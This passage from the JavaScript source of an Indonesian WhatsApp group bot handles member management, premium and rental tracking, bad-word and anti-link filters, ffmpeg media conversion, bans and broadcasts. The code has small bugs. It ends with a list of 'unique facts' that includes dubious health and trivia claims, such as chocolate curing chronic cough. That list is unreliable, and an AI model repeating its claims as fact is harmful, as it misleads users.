									jpegThumbnail: thumbnail}, 'extendedTextMessage', { detectLinks: false, contextInfo: {mentionedJid: [yeh]}, quoted: Ofc})
									break
						case 'add':
									try {
										if (!isGroup) return reply(mess.only.group)
										if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)  
										if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
										if (Ofc.message.extendedTextMessage === null || Ofc.message.extendedTextMessage === undefined) {
											entah = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
											response = await Zeeone.groupAdd(from, [entah])
											o = response.participants[0]
											let inv = (Object.values(o))
											if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
											if(inv[0].code == 403) return reply('Eror, user private acc')
											if(inv[0].code == 408) return reply('Eror, user baru saja keluar')
											if(inv[0].code == 401) return reply('Eror, Karena Bot Di Block Oleh Target')
												} else {
													entah = Ofc.message.extendedTextMessage.contextInfo.participant
													response = await Zeeone.groupAdd(from, [entah])
													o = response.participants[0]
													let inv = (Object.values(o))
													if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
													if(inv[0].code == 403) return reply('Gagal, Karena Di Private')
													if(inv[0].code == 408) return reply('Gagal, Karena Target Baru² Saja Keluar')
													if(inv[0].code == 401) return reply('Gagal, Karena Bot Di Block Oleh Target')
												}
											} catch {
												return 
											}
									break
						case 'auto':{
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (!q) return 
									if (
									args[0].toLowerCase() === 'ngetik' ||
									args[0].toLowerCase() === 'ketik' ||
									args[0].toLowerCase() === 'typing'
									){
										ngetik = true
										autovn = false
										reply(`Sukses....`)
										} else if (
										args[0].toLowerCase() === 'voicenote' ||
										args[0].toLowerCase() === 'recording' ||
										args[0].toLowerCase() === 'vn' 
									){
										ngetik = false
										autovn = true
										reply(`Sukses...`)
										} else {
											}
										}
									break
						case 'setnamabot':{
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} Alphabot`)
									Zeeone.updateProfileName(q)
									.then((res) => reply('Sukses Lord'))
									.catch((err) => reply('Eror Lord'))
									 }
									break
						case 'setbiobot':{
									 if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} Alphabot`)
									Zeeone.setStatus(q)
									.then((res) => reply('Sukses Lord'))
									.catch((err) => reply('Eror Lord'))
									}
									break
						case 'grup': case 'grub': case 'group':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (args[0] === "open") {
										Zeeone.groupSettingChange(from, GroupSettingChange.messageSend, false)
										} else if (args[0] === "close") {
											Zeeone.groupSettingChange(from, GroupSettingChange.messageSend, true)
											} else {
												reply (`Penggunaan ${prefix + command} buka / tutup`)
												}
									break
						case 'addcmd': case 'setcmd':
									if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
									if (isQuotedSticker) {
										if (!q) return reply(`Penggunaan : ${command} .menu dan tag stickernya`)
										var kodenya = Ofc.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
										addCmd(kodenya, q)
										reply(mess.succes)
										} else {
											reply('Reply stickenya')
											}
										break
						case 'delcmd':
									if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
									if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
									var kodenya = Ofc.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
									scommand.splice(getCommandPosition(kodenya), 1)
									fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
									reply(mess.succes)
									break
						case 'listcmd':
									let teksnyee = `「 *LIST STICKER CMD* 」`
									let cemde = [];
									for (let i of scommand) {
										cemde.push(i.id)
										teksnyee += `\n\n📍 *ID :* ${i.id}\n📍 *Cmd* : ${i.chats}`
										}
									mentions(teksnyee, cemde, true)
									break 
						case 'promote':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) return
										mentionede = Ofc.message.extendedTextMessage.contextInfo.participant
										await Zeeone.groupMakeAdmin(from, [mentionede])
										teks = `Members succes promote`
										Zeeone.sendMessage(from, teks, text, {quoted:Ofc})
									break
						case 'demote':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) return
										mentionede = Ofc.message.extendedTextMessage.contextInfo.participant
										await Zeeone.groupDemoteAdmin(from, [mentionede])
										teks = `Members succes promote`
										Zeeone.sendMessage(from, teks, text, {quoted:Ofc})
									break
						case 'setnamagrup': case 'setnamegrup': case 'setgrupname':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (args.length == 0) return reply(`Penggunaan ${prefix + command} Alphabot Support`)
										Zeeone.groupUpdateSubject(from, q)
										.then((res) => reply(jsonformat(res)))
										.catch((err) => reply(jsonformat(err)))
									break
						case 'setdesc': case 'setdesk': case 'setdeskripsi':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (args.length == 0)  return reply(`Penggunaan ${prefix + command} Alphabot Support`)
										Zeeone.groupUpdateDescription(from, q)
										.then((res) => reply(jsonformat(res)))
										.catch((err) => reply(jsonformat(err)))
									break
						case 'setppbot':
									if (!isOwner && !Ofc.key.fromMe) return
									if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
									enmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await Zeeone.downloadAndSaveMediaMessage(enmedia)
									await Zeeone.updateProfilePicture(botNumber, media)
									reply('Makasih pp barunya lord 🌝')
									break
						case 'setppgrup':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									if (isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										let media = await Zeeone.downloadMediaMessage(encmedia)
										Zeeone.updateProfilePicture(from, media)
										.then((res) => reply(jsonformat(res)))
										.catch((err) => reply(jsonformat(err)))
										} else if (isQuotedSticker){
											if (Ofc.message.videoMessage) return reply('Error Bro Wkwkwk')
											encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
											media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
											ran = getRandom('.png')
											exec(`ffmpeg -i ${media} ${ran}`, (err) => {
												fs.unlinkSync(media)
												if (err) return reply('Eror Lord')
												buffer = fs.readFileSync(ran)
												Zeeone.updateProfilePicture(from, buffer)
												fs.unlinkSync(ran)
												})
											} else {
												reply(`Kirim atau tag gambar dengan caption ${prefix + command}`)
											}
									break
						case 'premium': 
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (args[0] === 'add') {
										if (Ofc.message.extendedTextMessage != undefined) {
											mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid
											premium.addPremiumUser(mentioned[0], args[2], _premium)
											reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${mentioned[0]}\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
											} else {
												premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
												reply(`*「 PREMIUM ADDED 」*\n\n📛 *ID*: ${args[1]}@s.whatsapp.net\n⏰ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
												}
												} else if (args[0] === 'del') {
													if (Ofc.message.extendedTextMessage != undefined) {
														mentioned = Ofc.message.extendedTextMessage.contextInfo.mentionedJid
														_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
														fs.writeFileSync('./database/premium.json', JSON.stringify(_premium))
														reply(mess.succes)
														} else {
															_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
															fs.writeFileSync('./database/premium.json', JSON.stringify(_premium))
															reply(mess.succes)
															}
															} else {
																 reply(`Example : ${prefix + command} add/del 62887435047326 10s`)
															}
										break
						case 'cekprem': case 'cekpremium': case 'premiumcek':
									if (!isPremium) return reply(`Kamu bukan user premium\nkirim perintah ${prefix}daftarprem untuk membeli premium`)
									let cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
									let premiumnya = `*「 PREMIUM EXPIRE 」*\n\n🆔 *ID*: ${sender}\n⏰ *Expired*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`
									reply(`${isOwner?'Unlimited Prem (My Lord)':premiumnya}`)
									break
						
						case 'listprem': case 'listpremium': case 'premiumlist': case 'premlist':
									if (!isOwner && !Ofc.key.fromMe) return
									let txt = `*「 LIST PREMIUM 」*\n\n*💹 Total :* ${_premium.length}\n\n`
									let men = [];
									for (let i of _premium){
										men.push(i.id)
										let cekvip = ms(i.expired - Date.now())
										txt += `*🆔 Nomor : ${i.id.split("@")[0]}*\n*📛 User : @${i.id.split("@")[0]}*\n?? Expired : ${cekvip.days} Day (s), ${cekvip.hours} Hour (s), ${cekvip.minutes} Minute (s), ${cekvip.seconds} Second (s)`
									}
									reply(`${txt}`)
									break
						case 'extend': case 'perpanjang':
									if (!isSewa) return reply('Kamu belum sewa bot sebelumnya? klik #sewabot')
									reply('Sedang Mengirim Pesan Perpanjangan Masa Sewa Ke Owner Bot')
									Zeeone.sendMessage(`${owner_number}@s.whatsapp.net`, `Hai Owner, @${sender.split("@")[0]} Mau Memperpanjang Waktu Sewa Bot`, text, {contextInfo: {"mentionedJid" : [sender]}})
									break
						case 'sewa':{
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.sewabot)
									if(!isGroup) return reply(mess.only.group)
									if (q === 'add') {
										_sewa.addSewaGroup(from, args[1], sewa)
										reply(`Sukses Lord`)
									} else if (q === 'del') {
										sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
										fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
										reply(`Sukses Lord`)
										} else {
										}
									}
									break
						case 'sewalist':  case 'listsewa':
									if (!isOwner && !Ofc.key.fromMe) return
									let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
									for (let i of sewa){
										let cekviopp = ms(i.expired - Date.now())
										txtnyee += `🆔 *ID :* ${i.id}\n📊 *Expire :* ${cekviopp.days} day(s) ${cekviopp.hours} hour(s) ${cekviopp.minutes} minute(s) ${cekviopp.seconds} second(s)\n\n`
										}
										reply(txtnyee)
									break
						case 'sewacheck': case 'ceksewa':  case 'sewacek':
									if (!isGroup) return reply(mess.only.group)
									if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
									let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
									let sewenye = `「 *SEWA EXPIRE* 」

🆔 *ID*: ${from}
💹 *EXPIRE :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
									reply(sewenye)
									break
						case 'antibadword': case 'nobadword':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group`)
									if (args.length === 0) return reply(`Pilih on atau off`)
									if (args[0] == 'on'){
										if (isBadword) return reply(`Udah aktif Lord`)
										grupbadword.push(from)
										fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
										reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
										} else if (args[0] == 'off'){
											anu = grupbadword.indexOf(from)
											grupbadword.splice(anu, 1)
											fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
											reply('Antibadword Grup Dimatikan')
											} else {
												reply('pilih on / off')
												}
									break
						case 'antilink':
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)
										if (args[0].toLowerCase() === 'on'){
											if (isAntiLink) return reply(`Sudah Di Aktifkan Sebelumnya!`)
											antilink.push(from)
											fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
											reply(`Succes mengaktifkan Fitur Antilink`)
											} else if (args[0].toLowerCase() === 'off'){
												if (!isAntiLink) return reply(`Fitur Ini Belum Pernah Di Aktifkan Di Group Ini`)
												var au = antilink.indexOf(from)
												antilink.splice(au, 1)
												fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
												reply(`Succes Mematikan Fitur Antilink`)
												} else {
													reply(`Penggunaan ${prefix + command} on / off`)
													}
											break
						case 'welcome':
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)
										if (args[0].toLowerCase() === 'on'){
											if (welcome === true) return reply('Udah on')
											welcome = true
											leave = true
											reply(`Succes mengaktifkan fitur welcome dan leave`)
											} else if (args[0].toLowerCase() === 'off'){
												if (welcome === false) return
												welcome = false
												leave = false
												reply(`Succes Mematikan Fitur Welcome & Leave`)
												} else {
													reply(`Penggunaan ${prefix + command} on / off`)
													}
											break
						case 'listbadword':
									if (isBanned) return
									let bi = `List badword\n\n`
									for (let boo of badword){
										bi += `- ${boo}\n`
										}
										bi += `\nTotal : ${badword.length}`
									reply(bi)
									break
						case 'addbadword':
									if (!isOwner && !Ofc.key.fromMe)return reply(mess.only.owner) 
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										if (isKasar(args[0].toLowerCase(), badword)) return reply(`Cari nama lain Lord`)
										addBadword(args[0].toLowerCase(), badword)
										reply(`Sukses Lord`)
										} else {
											if (isKasar(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)) return reply(`Udah ada`)
											addBadword(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)
											reply(`Sukses Lord`)
										}
									break
						case 'delbadword':{
									if (!isOwner && !Ofc.key.fromMe)return reply(mess.only.owner) 
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										if (!isKasar(args[0].toLowerCase(), badword)) return reply(`Tidak ada dalam list`)
										delBadword(args[0].toLowerCase(), badword)
										reply(`Sukses Lord`)
										} else {
											if (!isKasar(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)) return reply(`Tidak ada dalam list`)
											delBadword(Ofc.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)
											reply(`Sukses Lord`)
										}
									}
									break
						case 'clearbadword':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (!m.quoted) return reply(`Reply Pesan Target!`)
									entah = Ofc.message.extendedTextMessage.contextInfo.participant
									delCountKasar(entah, senbadword)
									reply(`Sukses clear badword ${entah}`)
									break
						case 'antitroli': case 'antifaketroli':{
									try {
										if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)
										if (args[0].toLowerCase() === 'on'){
											if (isAntro) return reply(`Sudah Di Aktifkan Sebelumnya!`)
											atro.push(from)
											fs.writeFileSync('./database/ATO.json', JSON.stringify(atro))
											reply(`Succes mengaktifkan Fitur Anti-Troli`)
											} else if (args[0].toLowerCase() === 'off'){
												if (!isAntro) return reply(`Fitur Ini Belum Pernah Di Aktifkan Di Group Ini`)
												var ou = atro.indexOf(from)
												atro.splice(ou, 1)
												fs.writeFileSync('./database/ATO.json', JSON.stringify(atro))
												reply(`Succes Mematikan Fitur Anti-Troli`)
												}
											} catch {
												}
											}
									break
						case 'me': case 'myinfo': case 'info': case 'profile': case 'profil':{
									var p = await Zeeone.getStatus(`${sender}`, MessageType.text)
									let cek = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
									Zeeone.sendMessage(from, pp_userz, image, {thumbnail:pp_userz, caption:` * USER PROFILE*

📛 Nama : ${pushname==undefined?sender.split("@")[0]:pushname}
🎯 Bio : ${p.status==undefined?`Not Found`:p.status}
💬 Tag : @${sender.split("@")[0]}
🆔 Api : wa.me/${sender.split("@")[0]}

⬣ Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
⬣ Balance : ${getBalance(sender, balance)}
⬣ Role : ${role}
⬣ Level : ${getLevelingLevel(sender)}
⬣ Xp : ${getLevelingXp(sender)}
⬣ Status : ${isOwner?`Owner`:isPremium?`Premium User
⬣ Expired Prem : ${cek.days} d, ${cek.hours} h, ${cek.minutes} m, ${cek.seconds} s`:isUser?`Free User`:`Belum Daftar`}
⬣ Baned : ${isBanned?`Terbanned`:`Tidak Terbanned`}`, quoted: Ofc, contextInfo:{mentionedJid:[sender]}})
									}
									break
						case 'tomp3': case 'tomusic': case 'toaudio':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!isQuotedVideo) return reply(`Reply video nya lord`)
									reply(mess.wait)
									var encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									var media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									var ran = getRandom('.mp4')
									exec(`ffmpeg -i ${media} ${ran}`, (err) => {
										fs.unlinkSync(media)
										if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
										var buffer = fs.readFileSync(ran)
										Zeeone.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: Ofc})
										fs.unlinkSync(ran)
										})
									limitAdd(sender, limit)
									break
						case 'toptt': case 'tovn':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!isQuotedAudio) return reply(`Reply Audionya Lord`)
									reply(mess.wait)
									var encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									var media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
									var ran = getRandom('.mp4')
									exec(`ffmpeg -i ${media} ${ran}`, (err) => {
										fs.unlinkSync(media)
										if (err) return reply('Gagal, pada saat mengkonversi video ke mp3')
										var buffer = fs.readFileSync(ran)
										Zeeone.sendMessage(from, buffer, audio, {ptt: true, mimetype: 'audio/mp4', quoted: Ofc})
										fs.unlinkSync(ran)
										})
										limitAdd(sender, limit)
									break
						case 'toimg': 
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									reply(mess.wait)
									if (!isQuotedSticker) return reply('Reply stiker Lord')
									if ((isMedia && !Ofc.message.videoMessage || isQuotedImage || isQuotedSticker && args.length == 0)) {
										encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.png')
										exec(`ffmpeg -i ${media} ${ran}`, (err) => {
											fs.unlinkSync(media)
											if (err) return reply('❎ Gagal, pada saat mengkonversi sticker ke gambar ❎')
											buffer = fs.readFileSync(ran)
											Zeeone.sendMessage(from, buffer, image, {thumbnail : thumbnail, caption:'Sukses Lord',quoted:Ofc})
											fs.unlinkSync(ran)
											})
										} else {
											reply(`Reply Stiker Nya Lord`)
										}
										limitAdd(sender, limit)
									break
						case 'togif':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if ((isMedia && !Ofc.message.videoMessage || isQuotedSticker) && args.length == 0) {
									ger = isQuotedSticker ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
									let owogi = await Zeeone.downloadAndSaveMediaMessage(ger)
									webp2mp4File(owogi).then(async res=>{
										let ksksn = await getBuffer(res.result)
										Zeeone.sendMessage(from, ksksn, MessageType.video, {mimetype: 'video/gif', gifPlayback: true, caption: 'Sukses Lord', quoted: Ofc })
										})
										}else {
											reply('reply stiker')
											 }
									fs.unlinkSync(owgi)
									limitAdd(sender, limit)
									break
						case 'tovideo': case 'tomp4':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if ((isMedia && !Ofc.message.videoMessage || isQuotedSticker) && args.length == 0) {
									ger = isQuotedSticker ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
									let owogi = await Zeeone.downloadAndSaveMediaMessage(ger)
									webp2mp4File(owogi).then(res=>{
										sendMediaURL(from,res.result,'Done')
										})
										}else {
											reply('reply stiker')
											 }
									fs.unlinkSync(owgi)
									limitAdd(sender, limit)
									break
						case 'tourl': case 'imagetorul': case 'imgtourl': case 'videotourl': case 'tolink':
									if ((isMedia && !Ofc.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
 									 boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Ofc
									 owgi = await Zeeone.downloadMediaMessage(boij)
									 res = await uploadImages(owgi)
									 reply(res)
										} else {
											reply('kirim/reply gambar/video')
										}
											break
						case 'q': case 'ulang':
									if (!m.quoted) return reply('reply pesan!')
									var jpio = Zeeone.serializeM(await m.getQuotedObj())
									if (!jpio.quoted) return reply('pesan yang anda reply tidak mengandung reply!')
									await jpio.quoted.copyNForward(m.chat, true)
									break
						case 'block':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ny = `${args[0].replace('@', '')}@c.us`
										Zeeone.blockUser (`${ny}@c.us`, "add")
										reply(`Nomor ${ny} telah di blockir!`)
										} else {
											ny = `${mentionUser}`
											Zeeone.blockUser (`${ny.replace("@s.whatsapp.net","@c.us")}`, "add")
											reply(`Nomor ${ny.replace("@s.whatsapp.net","@c.us")} telah blockir!`)
											}
									break
						case 'unblock':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ny = `${args[0].replace('@', '')}@c.us`
										Zeeone.blockUser (`${ny}@c.us`, "remove")
										reply(`Nomor ${ny} telah di unblockir!`)
										} else {
											ny = `${mentionUser}`
											Zeeone.blockUser (`${ny.replace("@s.whatsapp.net","@c.us")}`, "remove")
											reply(`Nomor ${ny.replace("@s.whatsapp.net","@c.us")} telah dibanned!`)
										}
										limitAdd(sender, limit)
									break
						case 'banlist': case 'blocklist': case 'listban': case 'listblock': 
									teks = '╭────「 *BANNED  LIST* 」\n'
									for (let hui of ban) {
										teks += `│+  @${hui.split('@')[0]}\n`
										}
										teks += `│+ Total : ${ban.length}\n╰──────「 *LORD BOT* 」────`
										Zeeone.sendMessage(from, teks.trim(), extendedText, { quoted: Ofc, contextInfo: { "mentionedJid": [hui] } })		
									 break
			 		case 'ban':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ny = `${args[0].replace('@', '')}@s.whatsapp.net`
										ban.push(ny)
										fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
										reply(`Nomor ${ny} telah dibanned!`)
										} else {
											ny = `${mentionUser}`
											ban.push(ny)
											fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
											reply(`Nomor ${ny} telah dibanned!`)
										}
										limitAdd(sender, limit)
									break
						case 'unban':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ah = `${args[0].replace("@","")}@s.whatsapp.net`
										unb = ban.indexOf(ah)
										ban.splice(unb, 1)
										fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
										reply(`Nomor ${ah} telah di unban!`)
										} else {
											ah = `${mentionUser}`
											unb = ban.indexOf(ah)
											ban.splice(unb, 1)
											fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
											reply(`Nomor ${ah} telah di unban!`)
										}
										limitAdd(sender, limit)
									break
						case 'resetlimit':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									Zeeone.updatePresence(from, Presence.avaible)
									fs.writeFileSync('./database/limit.json', ('[]'))
									reply('Sukses Lord')
									await sleep(5000)
									limitAdd(sender, limit)
									break
						case 'bc': case 'broadcast':
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner) 
									if (args.length < 1) return reply(`${prefix + command} Alphabot`)
									anjir = await Zeeone.chats.all()
									if (isMedia && !Ofc.message.videoMessage || isQuotedImage) {
									const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
									buff = await Zeeone.downloadMediaMessage(encmedia)
									for (let _ of anjir) {
									await Zeeone.sendMessage(_.jid, buff, image, { caption: `${q}`})
									reply(`Sukses mengirim Broadcast`)
									}
									} else {
									for (let _ of anjir) {
										await Zeeone.sendMessage(`${_.jid}`, '*BROADCAST*' + '\n\n' + q, text, {quoted: ftroli})
										reply('Sukses Lord')
										}
									}
									limitAdd(sender, limit)
									break
						case 'tobc':
				if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner) 
				anu = await Zeeone.chats.all()
					if (isMedia && !Ofc.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
						buff = await Ofc.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Ofc.sendMessage(_.jid, buff, audio, { quoted: Ofc })
						}
						} else if (isMedia && !Ofc.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
						buff = await Zeeone.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Zeeone.sendMessage(_.jid, buff, sticker, { quoted: Ofc, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
						case 'faktaunik':{
									const faktau = ["Negara Indonesia berada di posisi ke-4 sebagai Negara Terindah di Dunia versi situs First Choice.","Di Italia, dalam aturannya minuman Cappuccino hanya boleh di minum sebelum waktu siang.","AS, Australia, Finlandia, Jerman dan Kanada adl negara maju tanpa UN. Tahukah anda sekolah trbaik di dunia ada di Finlandia walau tanpa UN.","","\"Jengkol is very nice\" komentar Pierre Bouvier vokalis Simple Plan.","Tiap satu kali jari kita mengklik mouse komputer, ada 1,42 kalori yang terbakar dalam tubuh. (Penelitian, Convert Anything to Calories).","Di Jepang kuno, prajurit diolesi minyak kodok pada tubuh mereka dengan keyakinan bahwa hal itu akan membuat tubuh mereka antirobek."," Di Jepang, ketiduran saat bekerja (inemuri) dapat ditolerir, karena dipandang sebagai kelelahan yang muncul akibat bekerja terlalu keras.","Gergaji mekanik awalnya diciptakan sebagai alat kedokteran untuk membantu melahirkan bayi.","Jangan sering mengatakan kata  di Australia dan Selandia Baru. Di sana, kata berarti mengajak untuk melakukan hubungan seks.","Jamur merang Laetiporus dikenal sebagai julukan \"ayam hutan\" karena konon rasanya mirip seperti daging ayam goreng.","Kaki katak merupakan hidangan istimewa di eropa. Tahukah Anda: sekitar 80% impor katak Eropa berasal dari Indonesia.","Jika Anda mengetik \"do the harlem shake\" di search bar YouTube, layar akan melakukan Harlem Shake!. [Google Chrome]","Melihat melalui lubang kecil akan segera meningkatkan penglihatan Anda sementara.","YouTube menyebutkan rata-rata ada 4000 video baru Harlem Shake yang diunggah setiap hari. [Yahoo!]","Semut memiliki kuburan sendiri. Tapi tahukah anda: Gurita memiliki kebun dan suka berkebun. (wikipedia)","Coklat mengandung Theobromine, molekul organik yang dapat membantu menguatkan enamel gigi. (Penelitian dari Tulane University).","Wanita 2 kali lebih banyak menggunakan emoticon dalam pesan teks dibandingkan pria. (Penelitian di Rice University)","Biarpun Buzz Aldrin adalah orang kedua yang menginjak di bulan tetapi ia adalah orang pertama yang membuang kotoran di ruang angkasa.","Fakta unik berikutnya adalah, Psikolog mengatakan bahwa mengirim dan menerima pesan teks benar-benar dapat meningkatkan mood Anda ketika Anda merasa kesepian. (Telegraph)","Thailand merupakan satu-satunya negara di Asia Tenggara yang tidak pernah dijajah.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. (cracked .com)"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. (BBCnews)","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Semakin pahit cokelat (tinggi zat theobromine), semakin tinggi manfaatnya. Rajin mengkonsumsi 1bar cokelat/hari dapat menyembuhkan batuk kronis.","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta 